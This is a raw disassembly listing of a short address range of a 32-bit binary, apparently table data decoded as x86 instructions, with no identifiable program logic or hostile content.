  40629e:	00 00                	add    %al,(%eax)
  4062a0:	00 00                	add    %al,(%eax)
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	c6                   	(bad)
  4062a5:	0d 01 10 ec 00       	or     $0xec1001,%eax
  4062aa:	76 00                	jbe    0x4062ac
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	00 00                	add    %al,(%eax)
  4062b2:	c6                   	(bad)
  4062b3:	0d 0e 10 f0 00       	or     $0xf0100e,%eax
  4062b8:	76 00                	jbe    0x4062ba
  4062ba:	d6                   	salc
  4062bb:	43                   	inc    %ebx
  4062bc:	00 00                	add    %al,(%eax)
  4062be:	00 00                	add    %al,(%eax)
  4062c0:	e6 09                	out    %al,$0x9
  4062c2:	e3 0f                	jecxz  0x4062d3
  4062c4:	06                   	push   %es
  4062c5:	01 77 00             	add    %esi,0x0(%edi)
  4062c8:	de 43 00             	fiadds 0x0(%ebx)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 e6                	add    %ah,%dh
  4062cf:	09 f2                	or     %esi,%edx
  4062d1:	0f cf                	bswap  %edi
  4062d3:	02 77 00             	add    0x0(%edi),%dh
  4062d6:	e7 43                	out    %eax,$0x43
  4062d8:	00 00                	add    %al,(%eax)
  4062da:	00 00                	add    %al,(%eax)
  4062dc:	e6 09                	out    %al,$0x9
  4062de:	01 10                	add    %edx,(%eax)
  4062e0:	ec                   	in     (%dx),%al
  4062e1:	00 78 00             	add    %bh,0x0(%eax)
  4062e4:	ef                   	out    %eax,(%dx)
  4062e5:	43                   	inc    %ebx
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	00 00                	add    %al,(%eax)
  4062ea:	e6 09                	out    %al,$0x9
  4062ec:	0e                   	push   %cs
  4062ed:	10 f0                	adc    %dh,%al
  4062ef:	00 78 00             	add    %bh,0x0(%eax)
  4062f2:	64 44                	fs inc %esp
  4062f4:	00 00                	add    %al,(%eax)
  4062f6:	00 00                	add    %al,(%eax)
  4062f8:	91                   	xchg   %eax,%ecx
  4062f9:	00 43 10             	add    %al,0x10(%ebx)
  4062fc:	d4 02                	aam    $0x2
  4062fe:	79 00                	jns    0x406300
  406300:	ec                   	in     (%dx),%al
  406301:	49                   	dec    %ecx
  406302:	00 00                	add    %al,(%eax)
  406304:	00 00                	add    %al,(%eax)
  406306:	91                   	xchg   %eax,%ecx
  406307:	00 64 10 da          	add    %ah,-0x26(%eax,%edx,1)
  40630b:	02 7a 00             	add    0x0(%edx),%bh
  40630e:	07                   	pop    %es
  40630f:	4a                   	dec    %edx
  406310:	00 00                	add    %al,(%eax)
  406312:	00 00                	add    %al,(%eax)
  406314:	86 18                	xchg   %bl,(%eax)
  406316:	4a                   	dec    %edx
  406317:	02 35 00 7c 00 f8    	add    0xf8007c00,%dh
  40631d:	43                   	inc    %ebx
  40631e:	00 00                	add    %al,(%eax)
  406320:	00 00                	add    %al,(%eax)
  406322:	86 18                	xchg   %bl,(%eax)
  406324:	4a                   	dec    %edx
  406325:	02 35 00 7c 00 00    	add    0x7c00,%dh
  40632b:	44                   	inc    %esp
  40632c:	00 00                	add    %al,(%eax)
  40632e:	00 00                	add    %al,(%eax)
  406330:	86 00                	xchg   %al,(%eax)
  406332:	41                   	inc    %ecx
  406333:	1e                   	push   %ds
  406334:	86 06                	xchg   %al,(%esi)
  406336:	7c 00                	jl     0x406338
  406338:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40633c:	00 00                	add    %al,(%eax)
  40633e:	86 00                	xchg   %al,(%eax)
  406340:	4c                   	dec    %esp
  406341:	1e                   	push   %ds
  406342:	86 06                	xchg   %al,(%esi)
  406344:	7e 00                	jle    0x406346
  406346:	4b                   	dec    %ebx
  406347:	44                   	inc    %esp
  406348:	00 00                	add    %al,(%eax)
  40634a:	00 00                	add    %al,(%eax)
  40634c:	86 00                	xchg   %al,(%eax)
  40634e:	64 1e                	fs push %ds
  406350:	8e 06                	mov    (%esi),%es
  406352:	80 00 00             	addb   $0x0,(%eax)
  406355:	00 01                	add    %al,(%ecx)
  406357:	00 85 10 00 00 02    	add    %al,0x2000010(%ebp)
  40635d:	00 8e 10 00 00 03    	add    %cl,0x3000010(%esi)
  406363:	00 99 10 00 00 04    	add    %bl,0x4000010(%ecx)
  406369:	00 a3 10 00 00 05    	add    %ah,0x5000010(%ebx)
  40636f:	00 aa 10 00 00 06    	add    %ch,0x6000010(%edx)
  406375:	00 b3 10 00 00 07    	add    %dh,0x7000010(%ebx)
  40637b:	00 bf 10 00 00 08    	add    %bh,0x8000010(%edi)
  406381:	00 c8                	add    %cl,%al
  406383:	10 00                	adc    %al,(%eax)
  406385:	20 09                	and    %cl,(%ecx)
  406387:	00 d4                	add    %dl,%ah
  406389:	10 00                	adc    %al,(%eax)
  40638b:	00 0a                	add    %cl,(%edx)
  40638d:	00 1b                	add    %bl,(%ebx)
  40638f:	11 00                	adc    %eax,(%eax)
  406391:	00 01                	add    %al,(%ecx)
  406393:	00 21                	add    %ah,(%ecx)
  406395:	11 00                	adc    %eax,(%eax)
  406397:	00 02                	add    %al,(%edx)
  406399:	00 29                	add    %ch,(%ecx)
  40639b:	11 00                	adc    %eax,(%eax)
  40639d:	00 03                	add    %al,(%ebx)
  40639f:	00 31                	add    %dh,(%ecx)
  4063a1:	11 00                	adc    %eax,(%eax)
  4063a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4063a6:	38 11                	cmp    %dl,(%ecx)
  4063a8:	00 00                	add    %al,(%eax)
  4063aa:	05 00 3d 11 00       	add    $0x113d00,%eax
  4063af:	00 06                	add    %al,(%esi)
  4063b1:	00 47 11             	add    %al,0x11(%edi)
  4063b4:	00 00                	add    %al,(%eax)
  4063b6:	01 00                	add    %eax,(%eax)
  4063b8:	4f                   	dec    %edi
  4063b9:	11 00                	adc    %eax,(%eax)
  4063bb:	00 01                	add    %al,(%ecx)
  4063bd:	00 4f 11             	add    %cl,0x11(%edi)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	01 00                	add    %eax,(%eax)
  4063c4:	4f                   	dec    %edi
  4063c5:	11 00                	adc    %eax,(%eax)
  4063c7:	00 01                	add    %al,(%ecx)
  4063c9:	00 4f 11             	add    %cl,0x11(%edi)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	01 00                	add    %eax,(%eax)
  4063d0:	4f                   	dec    %edi
  4063d1:	11 00                	adc    %eax,(%eax)
  4063d3:	00 01                	add    %al,(%ecx)
  4063d5:	00 55 11             	add    %dl,0x11(%ebp)
  4063d8:	00 00                	add    %al,(%eax)
  4063da:	01 00                	add    %eax,(%eax)
  4063dc:	47                   	inc    %edi
  4063dd:	11 00                	adc    %eax,(%eax)
  4063df:	00 01                	add    %al,(%ecx)
  4063e1:	00 5f 11             	add    %bl,0x11(%edi)
  4063e4:	00 00                	add    %al,(%eax)
  4063e6:	02 00                	add    (%eax),%al
  4063e8:	66 11 00             	adc    %ax,(%eax)
  4063eb:	00 03                	add    %al,(%ebx)
  4063ed:	00 72 11             	add    %dh,0x11(%edx)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	04 00                	add    $0x0,%al
  4063f4:	77 11                	ja     0x406407
  4063f6:	00 00                	add    %al,(%eax)
  4063f8:	01 00                	add    %eax,(%eax)
  4063fa:	55                   	push   %ebp
  4063fb:	11 00                	adc    %eax,(%eax)
  4063fd:	00 02                	add    %al,(%edx)
  4063ff:	00 77 11             	add    %dh,0x11(%edi)
  406402:	00 00                	add    %al,(%eax)
  406404:	01 00                	add    %eax,(%eax)
  406406:	7c 11                	jl     0x406419
  406408:	00 00                	add    %al,(%eax)
  40640a:	02 00                	add    (%eax),%al
  40640c:	83 11 00             	adcl   $0x0,(%ecx)
  40640f:	00 01                	add    %al,(%ecx)
  406411:	00 4f 11             	add    %cl,0x11(%edi)
  406414:	00 00                	add    %al,(%eax)
  406416:	01 00                	add    %eax,(%eax)
  406418:	4f                   	dec    %edi
  406419:	11 00                	adc    %eax,(%eax)
  40641b:	00 01                	add    %al,(%ecx)
  40641d:	00 4f 11             	add    %cl,0x11(%edi)
  406420:	00 00                	add    %al,(%eax)
  406422:	01 00                	add    %eax,(%eax)
  406424:	8c 11                	mov    %ss,(%ecx)
  406426:	00 00                	add    %al,(%eax)
  406428:	01 00                	add    %eax,(%eax)
  40642a:	92                   	xchg   %eax,%edx
  40642b:	11 00                	adc    %eax,(%eax)
  40642d:	00 02                	add    %al,(%edx)
  40642f:	00 9b 11 00 00 03    	add    %bl,0x3000011(%ebx)
  406435:	00 a5 11 00 00 04    	add    %ah,0x4000011(%ebp)
  40643b:	00 ac 11 00 00 01 00 	add    %ch,0x10000(%ecx,%edx,1)
  406442:	92                   	xchg   %eax,%edx
  406443:	11 00                	adc    %eax,(%eax)
  406445:	00 02                	add    %al,(%edx)
  406447:	00 9b 11 00 00 03    	add    %bl,0x3000011(%ebx)
  40644d:	00 a5 11 00 00 01    	add    %ah,0x1000011(%ebp)
  406453:	00 b5 11 00 00 02    	add    %dh,0x2000011(%ebp)
  406459:	00 bf 11 00 00 03    	add    %bh,0x3000011(%edi)
  40645f:	00 92 11 00 00 04    	add    %dl,0x4000011(%edx)
  406465:	00 9b 11 00 00 01    	add    %bl,0x1000011(%ebx)
  40646b:	00 ca                	add    %cl,%dl
  40646d:	11 00                	adc    %eax,(%eax)
  40646f:	00 02                	add    %al,(%edx)
  406471:	00 d3                	add    %dl,%bl
  406473:	11 00                	adc    %eax,(%eax)
  406475:	00 03                	add    %al,(%ebx)
  406477:	00 dd                	add    %bl,%ch
  406479:	11 02                	adc    %eax,(%edx)
  40647b:	20 04 00             	and    %al,(%eax,%eax,1)
  40647e:	e8 11 00 00 05       	call   0x5406494
  406483:	00 fe                	add    %bh,%dh
  406485:	11 00                	adc    %eax,(%eax)
  406487:	00 06                	add    %al,(%esi)
  406489:	00 06                	add    %al,(%esi)
  40648b:	12 00                	adc    (%eax),%al
  40648d:	00 01                	add    %al,(%ecx)
  40648f:	00 0d 12 00 00 02    	add    %cl,0x2000012
  406495:	00 12                	add    %dl,(%edx)
  406497:	12 00                	adc    (%eax),%al
  406499:	00 03                	add    %al,(%ebx)
  40649b:	00 1a                	add    %bl,(%edx)
  40649d:	12 00                	adc    (%eax),%al
  40649f:	00 01                	add    %al,(%ecx)
  4064a1:	00 92 11 00 00 02    	add    %dl,0x2000011(%edx)
  4064a7:	00 9b 11 00 00 03    	add    %bl,0x3000011(%ebx)
  4064ad:	00 22                	add    %ah,(%edx)
  4064af:	12 00                	adc    (%eax),%al
  4064b1:	00 01                	add    %al,(%ecx)
  4064b3:	00 33                	add    %dh,(%ebx)
  4064b5:	12 00                	adc    (%eax),%al
  4064b7:	00 02                	add    %al,(%edx)
  4064b9:	00 3a                	add    %bh,(%edx)
  4064bb:	12 00                	adc    (%eax),%al
  4064bd:	00 01                	add    %al,(%ecx)
  4064bf:	00 33                	add    %dh,(%ebx)
  4064c1:	12 00                	adc    (%eax),%al
  4064c3:	00 02                	add    %al,(%edx)
  4064c5:	00 3a                	add    %bh,(%edx)
  4064c7:	12 00                	adc    (%eax),%al
  4064c9:	00 01                	add    %al,(%ecx)
  4064cb:	00 3c 12             	add    %bh,(%edx,%edx,1)
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	01 00                	add    %eax,(%eax)
  4064d2:	5f                   	pop    %edi
  4064d3:	11 00                	adc    %eax,(%eax)
  4064d5:	00 02                	add    %al,(%edx)
  4064d7:	00 3a                	add    %bh,(%edx)
  4064d9:	12 00                	adc    (%eax),%al
  4064db:	00 01                	add    %al,(%ecx)
  4064dd:	00 42 12             	add    %al,0x12(%edx)
  4064e0:	00 00                	add    %al,(%eax)
  4064e2:	02 00                	add    (%eax),%al
  4064e4:	45                   	inc    %ebp
  4064e5:	12 00                	adc    (%eax),%al
  4064e7:	00 01                	add    %al,(%ecx)
  4064e9:	00 4e 12             	add    %cl,0x12(%esi)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	01 00                	add    %eax,(%eax)
  4064f0:	57                   	push   %edi
  4064f1:	12 00                	adc    (%eax),%al
  4064f3:	00 01                	add    %al,(%ecx)
  4064f5:	00 61 12             	add    %ah,0x12(%ecx)
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	01 00                	add    %eax,(%eax)
  4064fc:	6b 12 00             	imul   $0x0,(%edx),%edx
  4064ff:	00 01                	add    %al,(%ecx)
  406501:	00 21                	add    %ah,(%ecx)
  406503:	11 00                	adc    %eax,(%eax)
  406505:	00 02                	add    %al,(%edx)
  406507:	00 29                	add    %ch,(%ecx)
  406509:	11 00                	adc    %eax,(%eax)
  40650b:	00 03                	add    %al,(%ebx)
  40650d:	00 71 12             	add    %dh,0x12(%ecx)
  406510:	00 00                	add    %al,(%eax)
  406512:	01 00                	add    %eax,(%eax)
  406514:	21 11                	and    %edx,(%ecx)
  406516:	00 00                	add    %al,(%eax)
  406518:	02 00                	add    (%eax),%al
  40651a:	29 11                	sub    %edx,(%ecx)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	03 00                	add    (%eax),%eax
  406520:	7e 12                	jle    0x406534
  406522:	00 00                	add    %al,(%eax)
  406524:	04 00                	add    $0x0,%al
  406526:	86 12                	xchg   %dl,(%edx)
  406528:	00 00                	add    %al,(%eax)
  40652a:	01 00                	add    %eax,(%eax)
  40652c:	21 11                	and    %edx,(%ecx)
  40652e:	00 00                	add    %al,(%eax)
  406530:	02 00                	add    (%eax),%al
  406532:	29 11                	sub    %edx,(%ecx)
  406534:	00 00                	add    %al,(%eax)
  406536:	03 00                	add    (%eax),%eax
  406538:	aa                   	stos   %al,%es:(%edi)
  406539:	10 00                	adc    %al,(%eax)
  40653b:	00 04 00             	add    %al,(%eax,%eax,1)
  40653e:	8e 10                	mov    (%eax),%ss
  406540:	00 00                	add    %al,(%eax)
  406542:	05 00 94 12 00       	add    $0x129400,%eax
  406547:	00 06                	add    %al,(%esi)
  406549:	00 47 11             	add    %al,0x11(%edi)
  40654c:	00 00                	add    %al,(%eax)
  40654e:	01 00                	add    %eax,(%eax)
  406550:	21 11                	and    %edx,(%ecx)
  406552:	00 00                	add    %al,(%eax)
  406554:	02 00                	add    (%eax),%al
  406556:	29 11                	sub    %edx,(%ecx)
  406558:	00 00                	add    %al,(%eax)
  40655a:	03 00                	add    (%eax),%eax
  40655c:	aa                   	stos   %al,%es:(%edi)
  40655d:	10 00                	adc    %al,(%eax)
  40655f:	00 04 00             	add    %al,(%eax,%eax,1)
  406562:	8e 10                	mov    (%eax),%ss
  406564:	00 00                	add    %al,(%eax)
  406566:	01 00                	add    %eax,(%eax)
  406568:	ab                   	stos   %eax,%es:(%edi)
  406569:	12 00                	adc    (%eax),%al
  40656b:	00 02                	add    %al,(%edx)
  40656d:	00 bb 12 00 00 03    	add    %bh,0x3000012(%ebx)
  406573:	00 4f 11             	add    %cl,0x11(%edi)
  406576:	00 00                	add    %al,(%eax)
  406578:	01 00                	add    %eax,(%eax)
  40657a:	4f                   	dec    %edi
  40657b:	11 00                	adc    %eax,(%eax)
  40657d:	00 01                	add    %al,(%ecx)
  40657f:	00 29                	add    %ch,(%ecx)
  406581:	11 00                	adc    %eax,(%eax)
  406583:	00 01                	add    %al,(%ecx)
  406585:	00 4f 11             	add    %cl,0x11(%edi)
  406588:	00 00                	add    %al,(%eax)
  40658a:	01 00                	add    %eax,(%eax)
  40658c:	ab                   	stos   %eax,%es:(%edi)
  40658d:	12 00                	adc    (%eax),%al
  40658f:	00 02                	add    %al,(%edx)
  406591:	00 bb 12 00 00 03    	add    %bh,0x3000012(%ebx)
  406597:	00 4f 11             	add    %cl,0x11(%edi)
  40659a:	00 00                	add    %al,(%eax)
  40659c:	01 00                	add    %eax,(%eax)
  40659e:	4f                   	dec    %edi
  40659f:	11 00                	adc    %eax,(%eax)
  4065a1:	00 01                	add    %al,(%ecx)
  4065a3:	00 cb                	add    %cl,%bl
  4065a5:	12 00                	adc    (%eax),%al
  4065a7:	00 02                	add    %al,(%edx)
  4065a9:	00 d4                	add    %dl,%ah
  4065ab:	12 00                	adc    (%eax),%al
  4065ad:	00 01                	add    %al,(%ecx)
  4065af:	00 29                	add    %ch,(%ecx)
  4065b1:	11 00                	adc    %eax,(%eax)
  4065b3:	00 01                	add    %al,(%ecx)
  4065b5:	00 29                	add    %ch,(%ecx)
  4065b7:	11 00                	adc    %eax,(%eax)
  4065b9:	00 01                	add    %al,(%ecx)
  4065bb:	00 db                	add    %bl,%bl
  4065bd:	12 00                	adc    (%eax),%al
  4065bf:	00 02                	add    %al,(%edx)
  4065c1:	00 5d 0c             	add    %bl,0xc(%ebp)
  4065c4:	00 00                	add    %al,(%eax)
  4065c6:	01 00                	add    %eax,(%eax)
  4065c8:	3a 10                	cmp    (%eax),%dl
  4065ca:	00 00                	add    %al,(%eax)
  4065cc:	01 00                	add    %eax,(%eax)
  4065ce:	5d                   	pop    %ebp
  4065cf:	0c 00                	or     $0x0,%al
  4065d1:	00 01                	add    %al,(%ecx)
  4065d3:	00 4f 11             	add    %cl,0x11(%edi)
  4065d6:	00 00                	add    %al,(%eax)
  4065d8:	01 00                	add    %eax,(%eax)
  4065da:	4f                   	dec    %edi
  4065db:	11 00                	adc    %eax,(%eax)
  4065dd:	00 01                	add    %al,(%ecx)
  4065df:	00 4f 11             	add    %cl,0x11(%edi)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	01 00                	add    %eax,(%eax)
  4065e6:	4f                   	dec    %edi
  4065e7:	11 00                	adc    %eax,(%eax)
  4065e9:	00 01                	add    %al,(%ecx)
  4065eb:	00 4f 11             	add    %cl,0x11(%edi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	01 00                	add    %eax,(%eax)
  4065f2:	4f                   	dec    %edi
  4065f3:	11 00                	adc    %eax,(%eax)
  4065f5:	00 01                	add    %al,(%ecx)
  4065f7:	00 4f 11             	add    %cl,0x11(%edi)
  4065fa:	00 00                	add    %al,(%eax)
  4065fc:	01 00                	add    %eax,(%eax)
  4065fe:	4f                   	dec    %edi
  4065ff:	11 00                	adc    %eax,(%eax)
  406601:	00 01                	add    %al,(%ecx)
  406603:	00 4f 11             	add    %cl,0x11(%edi)
  406606:	00 00                	add    %al,(%eax)
  406608:	01 00                	add    %eax,(%eax)
  40660a:	4f                   	dec    %edi
  40660b:	11 00                	adc    %eax,(%eax)
  40660d:	00 01                	add    %al,(%ecx)
  40660f:	00 4f 11             	add    %cl,0x11(%edi)
  406612:	00 00                	add    %al,(%eax)
  406614:	01 00                	add    %eax,(%eax)
  406616:	4f                   	dec    %edi
  406617:	11 00                	adc    %eax,(%eax)
  406619:	00 01                	add    %al,(%ecx)
  40661b:	00 4f 11             	add    %cl,0x11(%edi)
  40661e:	00 00                	add    %al,(%eax)
  406620:	01 00                	add    %eax,(%eax)
  406622:	4f                   	dec    %edi
  406623:	11 00                	adc    %eax,(%eax)
  406625:	00 01                	add    %al,(%ecx)
  406627:	00 df                	add    %bl,%bh
  406629:	12 00                	adc    (%eax),%al
  40662b:	00 01                	add    %al,(%ecx)
  40662d:	00 33                	add    %dh,(%ebx)
  40662f:	12 00                	adc    (%eax),%al
  406631:	00 02                	add    %al,(%edx)
  406633:	00 3a                	add    %bh,(%edx)
  406635:	12 00                	adc    (%eax),%al
  406637:	00 01                	add    %al,(%ecx)
  406639:	00 33                	add    %dh,(%ebx)
  40663b:	12 00                	adc    (%eax),%al
  40663d:	00 02                	add    %al,(%edx)
  40663f:	00 3a                	add    %bh,(%edx)
  406641:	12 00                	adc    (%eax),%al
  406643:	00 01                	add    %al,(%ecx)
  406645:	00 33                	add    %dh,(%ebx)
  406647:	12 00                	adc    (%eax),%al
  406649:	00 02                	add    %al,(%edx)
  40664b:	00 3a                	add    %bh,(%edx)
  40664d:	12 00                	adc    (%eax),%al
  40664f:	00 01                	add    %al,(%ecx)
  406651:	00 6f 1e             	add    %ch,0x1e(%edi)
  406654:	15 00 50 00 39       	adc    $0x39005000,%eax
  406659:	01 4a 02             	add    %ecx,0x2(%edx)
  40665c:	e2 02                	loop   0x406660
  40665e:	49                   	dec    %ecx
  40665f:	01 4a 02             	add    %ecx,0x2(%edx)
  406662:	35 00 51 01 4a       	xor    $0x4a015100,%eax
  406667:	02 37                	add    (%edi),%dh
  406669:	01 59 01             	add    %ebx,0x1(%ecx)
  40666c:	4a                   	dec    %edx
  40666d:	02 37                	add    (%edi),%dh
  40666f:	01 61 01             	add    %esp,0x1(%ecx)
  406672:	4a                   	dec    %edx
  406673:	02 37                	add    (%edi),%dh
  406675:	01 69 01             	add    %ebp,0x1(%ecx)
  406678:	4a                   	dec    %edx
  406679:	02 37                	add    (%edi),%dh
  40667b:	01 71 01             	add    %esi,0x1(%ecx)
  40667e:	4a                   	dec    %edx
  40667f:	02 37                	add    (%edi),%dh
  406681:	01 79 01             	add    %edi,0x1(%ecx)
  406684:	4a                   	dec    %edx
  406685:	02 37                	add    (%edi),%dh
  406687:	01 81 01 4a 02 f0    	add    %eax,-0xffdb5ff(%ecx)
  40668d:	00 89 01 4a 02 35    	add    %cl,0x35024a01(%ecx)
  406693:	00 91 01 4a 02 37    	add    %dl,0x37024a01(%ecx)
  406699:	01 41 00             	add    %eax,0x0(%ecx)
  40669c:	4a                   	dec    %edx
  40669d:	02 ed                	add    %ch,%ch
  40669f:	02 99 01 1a 14 f3    	add    -0xcebe5ff(%ecx),%bl
  4066a5:	02 a1 01 30 14 f8    	add    -0x7ebcfff(%ecx),%ah
  4066ab:	02 a9 01 3e 14 3c    	add    0x3c143e01(%ecx),%ch
  4066b1:	00 09                	add    %cl,(%ecx)
  4066b3:	00 43 14             	add    %al,0x14(%ebx)
  4066b6:	33 01                	xor    (%ecx),%eax
  4066b8:	09 00                	or     %eax,(%eax)
  4066ba:	4a                   	dec    %edx
  4066bb:	02 35 00 b1 01 4a    	add    0x4a01b100,%dh
  4066c1:	02 14 03             	add    (%ebx,%eax,1),%dl
  4066c4:	c1 01 4a             	roll   $0x4a,(%ecx)
  4066c7:	02 35 00 99 01 7c    	add    0x7c019900,%dh
  4066cd:	14 3f                	adc    $0x3f,%al
  4066cf:	00 61 00             	add    %ah,0x0(%ecx)
  4066d2:	4a                   	dec    %edx
  4066d3:	02 1b                	add    (%ebx),%bl
  4066d5:	03 69 00             	add    0x0(%ecx),%ebp
  4066d8:	4a                   	dec    %edx
  4066d9:	02 1b                	add    (%ebx),%bl
  4066db:	03 29                	add    (%ecx),%ebp
  4066dd:	00 82 14 35 00 29    	add    %al,0x29003514(%edx)
  4066e3:	00 4a 02             	add    %cl,0x2(%edx)
  4066e6:	35 00 29 00 88       	xor    $0x88002900,%eax
  4066eb:	14 21                	adc    $0x21,%al
  4066ed:	03 29                	add    (%ecx),%ebp
  4066ef:	00 94 14 cf 02 c9 01 	add    %dl,0x1c902cf(%esp,%edx,1)
  4066f6:	ae                   	scas   %es:(%edi),%al
  4066f7:	14 cf                	adc    $0xcf,%al
  4066f9:	02 79 00             	add    0x0(%ecx),%bh
  4066fc:	ba 14 ec 00 79       	mov    $0x7900ec14,%edx
  406701:	00 c5                	add    %al,%ch
  406703:	14 ec                	adc    $0xec,%al
  406705:	00 79 00             	add    %bh,0x0(%ecx)
  406708:	cd 14                	int    $0x14
  40670a:	ec                   	in     (%dx),%al
  40670b:	00 79 00             	add    %bh,0x0(%ecx)
  40670e:	d7                   	xlat   %ds:(%ebx)
  40670f:	14 ec                	adc    $0xec,%al
  406711:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406714:	4a                   	dec    %edx
  406715:	02 1b                	add    (%ebx),%bl
  406717:	03 0c 00             	add    (%eax,%eax,1),%ecx
  40671a:	e0 14                	loopne 0x406730
  40671c:	2f                   	das
  40671d:	03 71 00             	add    0x0(%ecx),%esi
  406720:	4a                   	dec    %edx
  406721:	02 37                	add    (%edi),%dh
  406723:	03 69 00             	add    0x0(%ecx),%ebp
  406726:	f7 14 f0             	notl   (%eax,%esi,8)
  406729:	00 69 00             	add    %ch,0x0(%ecx)
  40672c:	fd                   	std
  40672d:	14 f0                	adc    $0xf0,%al
  40672f:	00 61 00             	add    %ah,0x0(%ecx)
  406732:	03 15 f0 00 61 00    	add    0x6100f0,%edx
  406738:	0e                   	push   %cs
  406739:	15 f0 00 d9 01       	adc    $0x1d900f0,%eax
  40673e:	22 15 5a 03 d9 01    	and    0x1d9035a,%dl
  406744:	34 15                	xor    $0x15,%al
  406746:	33 01                	xor    (%ecx),%eax
  406748:	21 00                	and    %eax,(%eax)
  40674a:	4a                   	dec    %edx
  40674b:	02 35 00 e1 01 4a    	add    0x4a01e100,%dh
  406751:	02 60 03             	add    0x3(%eax),%ah
  406754:	e9 01 67 15 66       	jmp    0x6655ce5a
  406759:	03 e9                	add    %ecx,%ebp
  40675b:	01 8d 15 6d 03 e1    	add    %ecx,-0x1efc92eb(%ebp)
  406761:	00 4a 02             	add    %cl,0x2(%edx)
  406764:	35 00 f9 01 4a       	xor    $0x4a01f900,%eax
  406769:	02 35 00 01 02 4a    	add    0x4a020100,%dh
  40676f:	02 35 00 c9 01 ae    	add    0xae01c900,%dh
  406775:	15 37 01 09 02       	adc    $0x2090137,%eax
  40677a:	4a                   	dec    %edx
  40677b:	02 1b                	add    (%ebx),%bl
  40677d:	03 c9                	add    %ecx,%ecx
  40677f:	01 bd 15 74 03 11    	add    %edi,0x11037415(%ebp)
  406785:	02 d1                	add    %cl,%dl
  406787:	15 7b 03 11 02       	adc    $0x211037b,%eax
  40678c:	dd 15 84 03 19 02    	fstl   0x2190384
  406792:	e8 15 ec 00 21       	call   0x214153ac
  406797:	02 4a 02             	add    0x2(%edx),%cl
  40679a:	1b 03                	sbb    (%ebx),%eax
  40679c:	c9                   	leave
  40679d:	01 f2                	add    %esi,%edx
  40679f:	15 8a 03 c9 01       	adc    $0x1c9038a,%eax
  4067a4:	02 16                	add    (%esi),%dl
  4067a6:	cf                   	iret
  4067a7:	02 c9                	add    %cl,%cl
  4067a9:	01 21                	add    %esp,(%ecx)
  4067ab:	16                   	push   %ss
  4067ac:	91                   	xchg   %eax,%ecx
  4067ad:	03 29                	add    (%ecx),%ebp
  4067af:	02 2e                	add    (%esi),%ch
  4067b1:	16                   	push   %ss
  4067b2:	97                   	xchg   %eax,%edi
  4067b3:	03 f9                	add    %ecx,%edi
  4067b5:	01 32                	add    %esi,(%edx)
  4067b7:	16                   	push   %ss
  4067b8:	cf                   	iret
  4067b9:	02 c9                	add    %cl,%cl
  4067bb:	01 ba 14 ec 00 c9    	add    %edi,-0x36ff13ec(%edx)
  4067c1:	01 cd                	add    %ecx,%ebp
  4067c3:	14 ec                	adc    $0xec,%al
  4067c5:	00 c9                	add    %cl,%cl
  4067c7:	01 4c 16 9e          	add    %ecx,-0x62(%esi,%edx,1)
  4067cb:	03 a1 01 56 16 a6    	add    -0x59e9a9ff(%ecx),%esp
  4067d1:	03 01                	add    (%ecx),%eax
  4067d3:	02 65 16             	add    0x16(%ebp),%ah
  4067d6:	ab                   	stos   %eax,%es:(%edi)
  4067d7:	03 31                	add    (%ecx),%esi
  4067d9:	02 7b 16             	add    0x16(%ebx),%bh
  4067dc:	b1 03                	mov    $0x3,%cl
  4067de:	29 00                	sub    %eax,(%eax)
  4067e0:	7f 16                	jg     0x4067f8
  4067e2:	8a 03                	mov    (%ebx),%al
  4067e4:	29 02                	sub    %eax,(%edx)
  4067e6:	8e 16                	mov    (%esi),%ss
  4067e8:	b7 03                	mov    $0x3,%bh
  4067ea:	29 00                	sub    %eax,(%eax)
  4067ec:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4067ed:	16                   	push   %ss
  4067ee:	bf 03 29 00 cd       	mov    $0xcd002903,%edi
  4067f3:	16                   	push   %ss
  4067f4:	c6 03 49             	movb   $0x49,(%ebx)
  4067f7:	02 e8                	add    %al,%ch
  4067f9:	16                   	push   %ss
  4067fa:	cd 03                	int    $0x3
  4067fc:	49                   	dec    %ecx
  4067fd:	02 fd                	add    %ch,%bh
  4067ff:	16                   	push   %ss
  406800:	33 01                	xor    (%ecx),%eax
  406802:	51                   	push   %ecx
  406803:	02 0f                	add    (%edi),%cl
  406805:	17                   	pop    %ss
  406806:	d3 03                	roll   %cl,(%ebx)
  406808:	29 00                	sub    %eax,(%eax)
  40680a:	25 17 da 03 29       	and    $0x2903da17,%eax
  40680f:	00 2e                	add    %ch,(%esi)
  406811:	17                   	pop    %ss
  406812:	cf                   	iret
  406813:	02 29                	add    (%ecx),%ch
  406815:	00 3e                	add    %bh,(%esi)
  406817:	17                   	pop    %ss
  406818:	cf                   	iret
  406819:	02 29                	add    (%ecx),%ch
  40681b:	00 5d 17             	add    %bl,0x17(%ebp)
  40681e:	e1 03                	loope  0x406823
  406820:	29 00                	sub    %eax,(%eax)
  406822:	6e                   	outsb  %ds:(%esi),(%dx)
  406823:	17                   	pop    %ss
  406824:	e1 03                	loope  0x406829
  406826:	29 00                	sub    %eax,(%eax)
  406828:	7f 17                	jg     0x406841
  40682a:	e8 03 c9 01 8a       	call   0x8a423132
  40682f:	17                   	pop    %ss
  406830:	33 01                	xor    (%ecx),%eax
  406832:	14 00                	adc    $0x0,%al
  406834:	93                   	xchg   %eax,%ebx
  406835:	17                   	pop    %ss
  406836:	ec                   	in     (%dx),%al
  406837:	00 69 02             	add    %ch,0x2(%ecx)
  40683a:	4a                   	dec    %edx
  40683b:	02 35 00 14 00 bf    	add    0xbf001400,%dh
  406841:	17                   	pop    %ss
  406842:	0f 04                	(bad)
  406844:	1c 00                	sbb    $0x0,%al
  406846:	cd 17                	int    $0x17
  406848:	21 04 61             	and    %eax,(%ecx,%eiz,2)
